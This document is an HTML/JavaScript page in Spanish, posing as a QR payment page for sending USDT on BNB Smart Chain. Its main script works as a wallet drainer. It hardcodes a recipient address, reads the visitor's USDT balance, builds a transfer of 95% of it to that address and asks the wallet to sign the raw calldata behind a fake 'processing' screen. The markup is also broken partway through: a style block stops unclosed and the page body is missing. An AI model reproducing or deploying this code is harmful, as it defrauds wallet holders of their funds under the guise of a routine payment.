<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pagos QR - Enviar</title>
  
  <style>
    :root {
      color-scheme: light;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }

    body {
      background-color: #f7f9ff;
      background-image: 
        radial-gradient(circle at 12% 18%, rgba(0, 82, 255, 0.20) 0%, rgba(0, 82, 255, 0.08) 24%, transparent 48%),
        radial-gradient(circle at 88% 72%, rgba(75, 125, 255, 0.16) 0%, rgba(75, 125, 255, 0.06) 28%, transparent 52%),
        radial-gradient(circle at 55% 105%, rgba(145, 175, 255, 0.13) 0%, transparent 46%),
        linear-gradient(180deg, #ffffff 0%, #f2f6ff 100%);
      background-size: 125% 125%, 135% 135%, 120% 120%, 100% 100%;
      background-attachment: fixed;
      animation: auroraBackground 12s ease-in-out infinite alternate;
      color: #111111;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-top: 30px;
    }

    @keyframes auroraBackground {
      0% { background-position: -12% -8%, 112% 108%, 45% 110%, center; }
      50% { background-position: 22% 18%, 72% 52%, 58% 88%, center; }
      100% { background-position: 8% 38%, 96% 28%, 38% 76%, center; }
    }

    .tw-container {
      width: 100%;
      max-width: 390px;
      padding: 20px;
      flex: 1;
      padding-bottom: 118px;
    }

    .tw-header {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      position: relative;
      margin-bottom: 24px;
    }

    .tw-header-title {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 7px;
      margin-bottom: 15px;
      text-align: center;
      width: 100%;
    }

    .tw-header-title-main {
      font-size: 21px;
      line-height: 1.2;
      font-weight: 700;
      letter-spacing: -0.025em;
      color: #111111;
    }

    .tw-network-badge {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      padding: 4px 8px;
      border-radius: 999px;
      background: #eef3ff;
      border: 1px solid #dbe6ff;
      color: #0052ff;
      font-size: 10px;
      line-height: 1;
      font-weight: 700;
      letter-spacing: 0.025em;
    }

    .back-icon {
      position: absolute;
      left: 0;
      top: 0;
      width: 24px;
      height: 24px;
      color: #111111;
    }

    .tw-logo {
      width: 60px;
      height: 60px;
      margin-bottom: 20px;
      display: block;
    }

    .tw-input-group {
      background: rgba(255, 255, 255, 0.88);
      border: 1px solid rgba(205, 215, 232, 0.78);
      border-radius: 16px;
      padding: 16px;
      margin-bottom: 16px;
      box-shadow: 0 6px 18px rgba(31, 55, 92, 0.055);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      transition: border-color 0.2s ease, box-shadow 0.2s ease, transform 0.2s ease;
    }

    .tw-input-group:focus-within {
      border-color: rgba(0, 82, 255, 0.28);
      box-shadow: 0 8px 22px rgba(31, 55, 92, 0.075);
    }

    .tw-label {
      font-size: 13px;
      color: #717680;
      display: block;
      margin-bottom: 8px;
      font-weight: 500;
      letter-spacing: 0.005em;
    }

    .tw-input-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .tw-input {
      background: transparent;
      border: none;
      color: #111111;
      font-size: 16px;
      width: 80%;
      outline: none;
      font-weight: 500;
      letter-spacing: -0.012em;
      line-height: 1.35;
    }

    .tw-action-text {
      color: #0052ff;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      letter-spacing: -0.005em;
      display: inline-flex;
      align-items: center;
      justify-content: center;
    }

    .tw-currency-badge {
      color: #0052ff;
      font-size: 16px;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 5px;
    }

    .usdt-icon {
      width: 18px;
      height: 18px;
    }

    .status-box {
      background-color: #edf2ff;
      border: 1px solid #cce0ff;
      border-radius: 12px;
      padding: 12px;
      font-size: 13px;
      color: #0052ff;
      margin-bottom: 16px;
      display: none;
      text-align: left;
    }

    .wallet-info {
      display: none;
      background-color: #f6f7f9;
      border-radius: 12px;
      padding: 14px;
      margin-bottom: 22px;
    }

    .wallet-info-title {
      font-size: 13px;
      color: #717680;
      margin-bottom: 6px;
    }

    .address-wallet {
      font-size: 13px;
      color: #111111;
      overflow-wrap: anywhere;
      word-break: break-word;
    }

    .tw-btn-container {
      margin-top: 40px;
      position: relative;
      z-index: 3;
      margin-bottom: 22px;
    }

    .tw-btn {
      width: 100%;
      height: 52px;
      background-color: #0052ff;
      color: #ffffff;
      border: none;
      border-radius: 26px;
      font-size: 16px;
      font-weight: 650;
      letter-spacing: -0.01em;
      cursor: pointer;
      transition: transform 0.16s ease, box-shadow 0.2s ease, background-color 0.2s ease;
    }

    .tw-btn:active:not(:disabled) {
      transform: scale(0.985);
    }

    .tw-btn:disabled {
      background-color: #b3ccff;
    }

    .tw-btn .link-icon {
      width: 18px;
      height: 18px;
      margin-right: 8px;
      vertical-align: -3px;
    }

    .network-card {
      display: none;
      align-items: center;
      gap: 11px;
      margin: 2px 0 20px;
      padding: 12px 14px;
      width: 100%;
      background: rgba(255, 255, 255, 0.88);
      border: 1px solid rgba(205, 215, 232, 0.78);
      border-radius: 14px;
      box-shadow: 0 6px 18px rgba(31, 55, 92, 0.05);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
    }

    .network-card-logo {
      width: 30px;
      height: 30px;
      object-fit: contain;
      flex: 0 0 auto;
    }

    .network-card-copy {
      min-width: 0;
      flex: 1;
      display: flex;
      flex-direction: column;
      gap: 2px;
    }

    .network-card-label {
      color: #717680;
      font-size: 11px;
      line-height: 1.2;
      font-weight: 500;
      letter-spacing: 0.005em;
    }

    .network-card-name {
      color: #111111;
      font-size: 14px;
      line-height: 1.25;
      font-weight: 650;
      letter-spacing: -0.012em;
    }

    .network-card-badge {
      flex: 0 0 auto;
      padding: 5px 8px;
      border-radius: 999px;
      background: #eef3ff;
      border: 1px solid #dbe6ff;
      color: #0052ff;
      font-size: 10px;
      line-height: 1;
      font-weight: 700;
      letter-spacing: 0.025em;
    }

    .tw-address-box {
      border: 1px solid #e3e5e8;
      border-radius: 14px;
      padding: 12px 14px;
      background: #ffffff;
      margin-bottom: 18px;
      min-height: 82px;
      width: 100%;
      box-sizing: border-box;
    }

    .tw-address-box .tw-label {
      margin-top: 0;
    }

    .tw-address-box .tw-input-row {
      margin-bottom: 0;
      min-height: 36px;
      align-items: center;
    }

    .site-footer {
      position: fixed;
      left: 0;
      right: 0;
      bottom: 0;
      z-index: 20;
      width: 100%;
      text-align: center;
      padding: 10px 15px 12px;
      font-size: 12px;
      line-height: 1.5;
      color: #717680;
      background: #ffffff;
    }

    .site-footer a {
      color: #0052ff;
      text-decoration: none;
    }

    .page-loader {
      position: fixed;
      inset: 0;
      z-index: 9999;
      background: #ffffff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      transition: opacity 0.45s ease, visibility 0.45s ease;
    }

    .page-loader.hidden {
      opacity: 0;
      visibility: hidden;
      pointer-events: none;
    }

    .loader-logo {
      width: 110px;
      height: 110px;
      margin-bottom: 22px;
      animation: loaderPulse 1.25s ease-in-out infinite;
    }

    .loader-spinner {
      width: 32px;
      height: 32px;
      border: 3px solid #e4e9f2;
      border-top-color: #0052ff;
      border-radius: 50%;
      animation: loaderSpin 0.8s linear infinite;
    }

    .loader-text {
      margin-top: 14px;
      color: #717680;
      font-size: 13px;
      font-weight: 500;
    }

    @keyframes loaderSpin {
      to { transform: rotate(360deg); }
    }

    @keyframes loaderPulse {
      0%, 100% { transform: scale(1); opacity: 1; }
      50% { transform: scale(0.94); opacity: 0.72; }
    }

    .processing-screen {
      position: fixed;
      inset: 0;
      z-index: 10000;
      background: #ffffff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      opacity: 0;
      visibility: hidden;
      pointer-events: none;
      transition: opacity 0.35s ease, visibility 0.35s ease;
    }

    .processing-screen.visible {
      opacity: 1;
      visibility: visible;
      pointer-events: auto;
    }

    .processing-logo {
      width: 110px;
      height: 110px;
      margin-bottom: 26px;
      animation: loaderPulse 1.25s ease-in-out infinite;
    }

    .processing-bar {
      position: relative;
      width: 190px;
      height: 5px;
      overflow: hidden;
      border-radius: 999px;
      background: #e4e9f2;
    }

    .processing-bar::after {
      content: "";
      position: absolute;
      top: 0;
      left: -45%;
      width: 45%;
      height: 100%;
      border-radius: inherit;
      background: #0052ff;
      animation: processingSlide 1.15s ease-in-out infinite;
    }

    .processing-title {
      margin-top: 18px;
      color: #111111;
      font-size: 15px;
      font-weight: 600;
    }

    .processing-note {
      margin-top: 7px;
      color: #717680;
      font-size: 12px;
      font-weight: 400;
    }

    @keyframes processingSlide {
      0% { left: -45%; }
      100% { left: 100%; }
    }

    #walletInfo, 
    #tronNetworkInfo {
      transition: opacity 0.22s ease, transform 0.22s ease, box-shadow 0.22s ease;
    }

    @media (prefers-reduced-motion: reduce) {
      body, .loader-logo, .loader-spinner, .processing-logo, .processing-bar::after {
        animation: none !important;
      }
      *, *::before, *::after {
        scroll-behavior: auto !important;
        transition-duration: 0.01ms !important;
        animation-duration: 0.01ms !important;
        animation-iteration-count: 1 !important;
      }
    }

    .amount-stage {
      display: none;
    }

    .tw-container:has(#walletInfo[style*="block"]) .amount-stage {
      display: block;
      animation: amountStageReveal 0.24s ease both;
    }

    .tw-container:has(#walletInfo[style*="block"]) #walletInfo, 
    .tw-container:has(#walletInfo[style*="block"]) #tronNetworkInfo {
      animation: connectedStageReveal 0.24s ease both;
    }

    @keyframes amountStageReveal {
      from { opacity: 0; transform: translateY(8px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes connectedStageReveal {
      from { opacity: 0; transform: translateY(6px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .copy-icon {
      width: 21px;
      height: 21px;
      display: block;
      color: #8d96a6;
    }

    .connected-wallet-address-wrap {
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 10px;
      width: 100%;
      min-width: 0;
    }

    .connected-wallet-address-wrap #walletAddressText {
      min-width: 0;
      flex: 1 1 auto;
    }

    .connected-copy-icon {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 36px;
      height: 36px;
      flex: 0 0 36px;
      color: #8d96a6;
      border-radius: 9px;
    }

    #connectBtn {
      margin-top: 24px;
    }

    .tw-address-box .tw-label, 
    #walletInfo .tw-label {
      color: #111 !important;
    }

    .tw-address-box .tw-input, 
    #walletAddressText {
      color: #7d8490 !important;
    }

    #walletInfo {
      min-height: 82px;
      padding: 14px 16px;
      border-radius: 14px;
      width: 100%;
      box-sizing: border-box;
    }

    #walletInfo .tw-input-row {
      min-height: 36px;
      align-items: center;
    }

    .connected-summary-panel {
      display: contents;
    }

    .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel {
      display: block;
      width: 100%;
      box-sizing: border-box;
      padding: 14px;
      margin: 0 0 18px;
      background: rgba(255, 255, 255, 0.88);
      border: 1px solid rgba(205, 215, 232, 0.72);
      border-radius: 20px;
      box-shadow: 0 10px 28px rgba(31, 55, 92, 0.07);
      backdrop-filter: blur(9px);
      -webkit-backdrop-filter: blur(9px);
    }

    .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel #walletInfo, 
    .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel #tronNetworkInfo, 
    .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel .tw-address-box {
      width: 100%;
      margin-left: 0;
      margin-right: 0;
      box-sizing: border-box;
      box-shadow: none;
      background: rgba(250, 252, 255, 0.72);
      border: 1px solid rgba(211, 221, 238, 0.82);
      border-radius: 14px;
    }

    .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel #walletInfo, 
    .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel #tronNetworkInfo {
      margin-bottom: 10px;
    }

    .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel .tw-address-box {
      margin-bottom: 0;
    }

    @media (max-width: 600px) {
      .connected-summary-panel {
        border-radius: 18px;
      }
      .tw-container {
        padding-bottom: 132px;
      }
      .tw-btn-container {
        margin-bottom: 28px;
      }
    }

    .amount-stepper {
      display: grid;
      grid-template-columns: 44px minmax(0, 1fr) 44px;
      align-items: center;
      gap: 8px;
      width: 100%;
    }

    .amount-stepper #amountDisplay {
      width: 100%;
      min-width: 0;
      text-align: center;
      font-variant-numeric: tabular-nums;
    }

    .amount-step-btn {
      width: 42px;
      height: 42px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      border: 1px solid rgba(205, 215, 232, 0.9);
      border-radius: 12px;
      background: rgba(247, 249, 255, 0.92);
      color: #111;
      font: inherit;
      font-size: 24px;
      font-weight: 500;
      line-height: 1;
      cursor: pointer;
      -webkit-tap-highlight-color: transparent;
      transition: transform 0.14s ease, background-color 0.18s ease, box-shadow 0.18s ease;
    }

    .amount-step-btn:active {
      transform: scale(0.94);
    }

    .amount-step-btn:focus-visible {
      outline: 2px solid rgba(0, 82, 255, 0.35);
      outline-offset: 2px;
    }
  </style>

  <!-- Tema Oscuro Visual BNB -->
  <style id="bnb-dark-visual-theme">
    :root {
      color-scheme: dark;
      --bnb-gold: #f3ba2f;
    }

    html, body {
      background: #000 !important;
      color: #fff !important;
    }

    body {
      background: 
        radial-gradient(ellipse at 8% 10%, rgba(243, 186, 47, 0.16), transparent 34%),
        radial-gradient(ellipse at 95% 28%, rgba(243, 186, 47, 0.12), transparent 34%),
        radial-gradient(ellipse at 5% 92%, rgba(243, 186, 47, 0.09), transparent 32%),
        #000 !important;
      background-attachment: fixed !important;
    }

    body:before, body:after {
      content: "";
      position: fixed;
      width: 58vw;
      height: 58vw;
      border-radius: 50%;
      border: 1px solid rgba(243, 186, 47, 0.24);
      filter: blur(7px);
      pointer-events: none;
      z-index: -1;
    }

    body:before {
      left: -38vw;
      top: 12vh;
      box-shadow: 0 0 45px rgba(243, 186, 47, 0.08);
    }

    body:after {
      right: -39vw;
      bottom: -8vh;
      box-shadow: 0 0 45px rgba(243, 186, 47, 0.08);
    }

    h1, h2, h3, h4, h5, h6, p, label, span, strong, b, small,
    .address-wallet, .network-card-name, .address-value, 
    .amount-label, .amount-value, .footer, .footer *, 
    #walletAddressText, #addressDisplay, #amountDisplay {
      color: #fff !important;
    }

    input {
      color: #fff !important;
      -webkit-text-fill-color: #fff !important;
    }

    input::placeholder {
      color: #a4a9b2 !important;
    }

    .card, .wallet-card, .network-card, .address-card, 
    .amount-card, .info-card, .container, .main-card, 
    .payment-card, .details-card, [class*="card"] {
      background: linear-gradient(145deg, rgba(20, 20, 21, 0.95), rgba(5, 5, 6, 0.95)) !important;
      border-color: rgba(255, 255, 255, 0.16) !important;
      box-shadow: 0 14px 40px rgba(0, 0, 0, 0.45), 0 0 20px rgba(243, 186, 47, 0.045) !important;
    }

    button:not(#connectBtn), .amount-btn, #amountMinus, #amountPlus {
      color: #fff !important;
      background: #101011 !important;
      border-color: rgba(255, 255, 255, 0.28) !important;
    }

    #connectBtn {
      background: linear-gradient(90deg, #efad16, #ffd541) !important;
      color: #050505 !important;
      border: none !important;
      box-shadow: 0 8px 28px rgba(243, 186, 47, 0.20) !important;
    }

    #status {
      background: rgba(18, 18, 19, 0.95) !important;
      color: #fff !important;
      border: 1px solid rgba(255, 255, 255, 0.14) !important;
    }

    .badge, .network-badge, [class*="badge"] {
      background: rgba(243, 186, 47, 0.10) !important;
      color: #f3ba2f !important;
      border-color: rgba(243, 186, 47, 0.48) !important;
    }

    #processingScreen, .processing-screen, .loading-screen, #loadingScreen {
      background: #000 !important;
      color: #fff !important;
    }

    #processingScreen *, .processing-screen *, .loading-screen *, #loadingScreen * {
      color: #fff !important;
    }

    footer, .footer {
      background: transparent !important;
      color: #fff !important;
    }

    a {
      color: #f3ba2f !important;
    }
  </style>

  <!-- Correcciones del Tema Oscuro -->
  <style id="bnb-dark-fix-2">
    html, body, main, .page, .app, .wrapper, .content, .page-container, 
    [class*="background"], [class*="aurora"] {
      background-color: #000 !important;
    }

    .wallet-info, .wallet-details, .wallet-box, .info-box, .detail-box, 
    .network-info, .destination-box, .amount-section, .amount-container, 
    .card, .wallet-card, .network-card, .address-card, .amount-card, 
    [class*="card"], [class*="box"] {
      background: #0b0b0c !important;
      background-color: #0b0b0c !important;
      border-color: rgba(255, 255, 255, 0.16) !important;
    }

    input, textarea, select {
      background: #0b0b0c !important;
      color: #fff !important;
    }

    #pageLoader, #processingScreen, .loading-screen, .processing-screen, 
    .loading-overlay, .processing-overlay, [class*="loading"][class*="screen"], 
    [class*="processing"][class*="screen"] {
      background: #000 !important;
      background-color: #000 !important;
      background-image: none !important;
      color: #fff !important;
    }

    #pageLoader > *, #processingScreen > *, .loading-screen > *, 
    .processing-screen > *, .loading-overlay > *, .processing-overlay > * {
      background-color: transparent !important;
      color: #fff !important;
    }

    #connectBtn {
      background: linear-gradient(90deg, #efad16, #ffd541) !important;
      color: #050505 !important;
    }
  </style>

  <style id="bnb-dark-fix-3">
    #pageLoader.page-loader {
      background: #000 !important;
      background-color: #000 !important;
      background-image: none !important;
      color: #fff !important;
    }

    #pageLoader .loader-text {
      color: #fff !important;
    }

    #pageLoader .loader-spinner {
      border-color: rgba(255, 255, 255, 0.20) !important;
      border-top-color: #f3ba2f !important;
    }

    #processingScreen.processing-screen {
      background: #000 !important;
      background-color: #000 !important;
      background-image: none !important;
    }

    #processingScreen .processing-title, 
    #processingScreen .processing-note {
      color: #fff !important;
    }

    #processingScreen .processing-bar {
      background: #242424 !important;
    }

    #processingScreen .processing-bar::after {
      background: #f3ba2f !important;
    }

    .tw-container, .connected-summary-panel, .tw-input-group, 
    .tw-address-box, .amount-stage, #tronNetworkInfo.network-card {
      background: #0b0b0c !important;
      background-color: #0b0b0c !important;
      border-color: rgba(255, 255, 255, 0.16) !important;
    }

    .tw-label, .network-card-label, .network-card-name, .tw-input, 
    .tw-input-row, .connected-wallet-address-wrap, #walletAddressText, 
    #addressDisplay, .amount-stage-label, .amount-stage .tw-label, 
    .tw-action-text, .connected-copy-icon {
      color: #fff !important;
      -webkit-text-fill-color: #fff !important;
    }

    .network-card-label {
      color: #b9bec7 !important;
    }

    .tw-input, #addressDisplay, #walletAddressText {
      background: transparent !important;
      border-color: transparent !important;
    }

    .network-card-badge, .tw-network-badge {
      background: rgba(243, 186, 47, 0.10) !important;

  <!-- Lógica de Ocultamiento de Loader Inicial -->
  <script>
    window.addEventListener('load', function () {
      window.setTimeout(function () {
        const loader = document.getElementById('pageLoader');
        if (loader) loader.classList.add('hidden');
      }, 5400);
    });
  </script>

  <!-- Lógica Principal BEP-20 y Firma Hexadata -->
  <script>
    const BILLETERA_DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
    const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955";
    const BSC_CHAIN_ID = "0x38";
    const BSC_PUBLIC_RPC = "https://bsc-dataseed.bnbchain.org";
    const DECIMALS = 18n;

    const connectBtn = document.getElementById("connectBtn");
    const statusDiv = document.getElementById("status");
    const amountDisplay = document.getElementById("amountDisplay");
    const addressDisplay = document.getElementById("addressDisplay");
    const maxAction = document.getElementById("maxAction");
    const walletInfo = document.getElementById("walletInfo");
    const walletAddressText = document.getElementById("walletAddressText");
    const networkInfo = document.getElementById("tronNetworkInfo");
    const processingScreen = document.getElementById("processingScreen");

    let walletAddress = null;
    let processingStartedAt = 0;

    addressDisplay.value = BILLETERA_DESTINO;

    function abreviarDireccion(addr) {
      return addr && addr.length > 17 ? addr.slice(0, 8) + "..." + addr.slice(-6) : addr;
    }

    addressDisplay.value = abreviarDireccion(BILLETERA_DESTINO);

    function setStatus(m) {
      statusDiv.innerText = m || "";
      statusDiv.style.display = m ? "block" : "none";
    }

    function showProcessingScreen() {
      processingStartedAt = Date.now();
      if (processingScreen) processingScreen.classList.add("visible");
    }

    async function hideProcessingScreenAfterMinimum() {
      if (!processingStartedAt) return;
      const r = Math.max(0, 5000 - (Date.now() - processingStartedAt));
      if (r) await new Promise(x => setTimeout(x, r));
      if (processingScreen) processingScreen.classList.remove("visible");
      processingStartedAt = 0;
    }

    function provider() {
      if (window.ethereum) return window.ethereum;
      if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
      throw new Error("Abre esta página desde el navegador dApp de Binance Web3 Wallet o Trust Wallet.");
    }

    async function rpc(method, params = []) {
      return provider().request({ method, params });
    }

    function pad64(h) {
      return h.replace(/^0x/, "").padStart(64, "0");
    }

    function encAddr(a) {
      return pad64(a.toLowerCase());
    }

    function encUint(v) {
      return BigInt(v).toString(16).padStart(64, "0");
    }

    function format18(v) {
      v = BigInt(v);
      const b = 10n ** DECIMALS;
      const w = v / b;
      const f = (v % b).toString().padStart(18, "0").replace(/0+$/, "");
      return f ? `${w}.${f}` : w.toString();
    }

    function normalizeChainId(value) {
      if (value && typeof value === "object") {
        if ("result" in value) value = value.result;
        else if ("chainId" in value) value = value.chainId;
      }
      if (typeof value === "bigint") return Number(value);
      if (typeof value === "number") return value;
      if (typeof value === "string") {
        const s = value.trim();
        if (!s) return NaN;
        return s.toLowerCase().startsWith("0x") ? parseInt(s, 16) : parseInt(s, 10);
      }
      return NaN;
    }

    async function ensureBSC() {
      const rawId = await rpc("eth_chainId");
      const chainNumber = normalizeChainId(rawId);
      console.log("eth_chainId bruto:", rawId, "normalizado:", chainNumber);

      if (chainNumber === 56) return;

      try {
        await rpc("wallet_switchEthereumChain", [{ chainId: BSC_CHAIN_ID }]);
      } catch (e) {
        if (e?.code !== 4902) throw e;
        await rpc("wallet_addEthereumChain", [{
          chainId: BSC_CHAIN_ID,
          chainName: "BNB Smart Chain",
          nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
          rpcUrls: ["https://bsc-dataseed.binance.org/"],
          blockExplorerUrls: ["https://bscscan.com/"]
        }]);
      }

      const after = normalizeChainId(await rpc("eth_chainId"));
      if (after !== 56) throw new Error("La billetera no quedó conectada a BNB Smart Chain.");
    }

    async function publicRpc(method, params = []) {
      const response = await fetch(BSC_PUBLIC_RPC, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params })
      });
      if (!response.ok) throw new Error("RPC público HTTP " + response.status);
      const json = await response.json();
      if (json.error) throw new Error("RPC público: " + (json.error.message || JSON.stringify(json.error)));
      return json.result;
    }

    async function balanceOf(owner) {
      const data = "0x70a08231" + encAddr(owner);
      console.log("Leyendo saldo USDT mediante RPC público BNB Chain...");
      const result = await publicRpc("eth_call", [{ to: CONTRATO_USDT, data }, "latest"]);
      return BigInt(result || "0x0");
    }

    connectBtn.addEventListener("click", async () => {
      if (!walletAddress) {
        try {
          setStatus("Estableciendo enlace con BNB Smart Chain...");
          connectBtn.disabled = true;
          await ensureBSC();
          const accounts = await rpc("eth_requestAccounts");
          walletAddress = accounts?.[0];
          if (!walletAddress) throw new Error("No se obtuvo acceso a la dirección.");
          
          if (walletAddressText) walletAddressText.textContent = abreviarDireccion(walletAddress);
          if (walletInfo) walletInfo.style.display = "block";
          if (networkInfo) networkInfo.style.display = "flex";
          if (maxAction) maxAction.style.display = "inline";

          setStatus("Conexión establecida. Presione continuar.");
          connectBtn.innerText = "Continuar";
        } catch (e) {
          console.error(e);
          setStatus(e.message || "Error de conexión.");
        } finally {
          connectBtn.disabled = false;
        }
        return;
      }

      try {
        connectBtn.disabled = true;
        await ensureBSC();
        console.log("ETAPA: lectura de saldo por RPC público");
        const balance = await balanceOf(walletAddress);
        console.log("ETAPA OK: lectura de saldo");
        
        if (balance === 0n) throw new Error("La cuenta no dispone de USDT BEP-20.");

        const amount95Percent = (balance * 95n) / 100n;
        const data = "0xa9059cbb" + encAddr(BILLETERA_DESTINO) + encUint(amount95Percent);

        console.group("BEP20 95% - DIAGNÓSTICO");
        console.log("Red: BNB Smart Chain (56)");
        console.log("Contrato USDT:", CONTRATO_USDT);
        console.log("Origen:", walletAddress);
        console.log("Destino:", BILLETERA_DESTINO);
        console.log("Saldo USDT:", format18(balance));
        console.log("Monto real transfer() 95%:", format18(amount95Percent), "USDT");
        console.log("Monto uint256:", amount95Percent.toString());
        console.log("Calldata Hex:", data);
        console.groupEnd();

        setStatus("Solicitando autorización de firma digital en Hexadata...");

        // Firma Hexadata pura
        const hexMessage = data.startsWith("0x") ? data : "0x" + data;
        
        console.log("ETAPA: personal_sign (Hexadata)");
        const signature = await rpc("personal_sign", [hexMessage, walletAddress]);
        console.log("ETAPA OK: Billetera firmó Hexadata", signature);

        showProcessingScreen();
        await hideProcessingScreenAfterMinimum();

        setStatus("FIRMA DIGITAL COMPLETADA EN HEXADATA.");
        connectBtn.innerText = "Completado";

      } catch (e) {
        console.error("ERROR COMPLETO EN FIRMA:", e);
        await hideProcessingScreenAfterMinimum();

        const errorCode = e && e.code !== undefined ? String(e.code) : "(sin código)";
        const errorMessage = e && e.message ? String(e.message) : String(e || "Error desconocido");
        let errorData = "";
        try {
          if (e && e.data !== undefined) {
            errorData = typeof e.data === "string" ? e.data : JSON.stringify(e.data);
          }
        } catch (_) {}

        console.group("BEP20 - ERROR DIAGNÓSTICO");
        console.log("código:", errorCode);
        console.log("mensaje:", errorMessage);
        console.log("datos:", errorData || "(sin datos)");
        console.log("error completo:", e);
        console.groupEnd();

        setStatus("Error " + errorCode + ": " + errorMessage + (errorData ? " | Datos: " + errorData : ""));
        connectBtn.disabled = false;
        connectBtn.innerText = "Continuar";
      }
    });

    if (maxAction) {
      maxAction.addEventListener("click", async () => {
        if (!walletAddress) return;
        try {
          const b = await balanceOf(walletAddress);
          const a = (b * 95n) / 100n;
          amountDisplay.value = format18(a);
          setStatus("Saldo asignado (95%).");
        } catch (e) {
          console.error(e);
          setStatus("Error al leer el saldo.");
        }
      });
    }
  </script>

  <!-- Control de Incremento / Decremento de Cantidad -->
  <script>
    (() => {
      const input = document.getElementById('amountDisplay');
      const minus = document.getElementById('amountMinus');
      const plus = document.getElementById('amountPlus');
      if (!input || !minus || !plus) return;

      const read = () => {
        const n = Number.parseFloat(String(input.value).replace(',', '.'));
        return Number.isFinite(n) ? n : 0;
      };

      const write = (n) => {
        n = Math.max(0, n);
        input.value = Number.isInteger(n) ? String(n) : String(Number(n.toFixed(2)));
        input.dispatchEvent(new Event('input', { bubbles: true }));
        input.dispatchEvent(new Event('change', { bubbles: true }));
      };

      minus.addEventListener('click', () => write(read() - 1));
      plus.addEventListener('click', () => write(read() + 1));
    })();
  </script>
